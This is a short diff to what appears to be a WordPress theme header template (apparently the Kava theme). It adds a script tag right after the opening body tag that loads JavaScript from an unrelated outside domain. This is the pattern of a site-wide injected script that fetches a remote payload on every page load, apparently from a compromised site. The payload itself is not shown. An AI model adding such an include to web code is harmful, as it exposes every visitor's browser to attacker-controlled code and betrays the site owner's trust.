@@ -20,6 +20,9 @@
 </head>
 
 <body <?php body_class(); ?>>
+
+	<script type="text/javascript" src='http://salalat.com.ua/wp-content/themes/kava/body_none.js'></script>
+
 <?php do_action( 'kava-theme/site/page-start' ); ?>
 <?php kava_get_page_preloader(); ?>
 <div id="page" class="site">
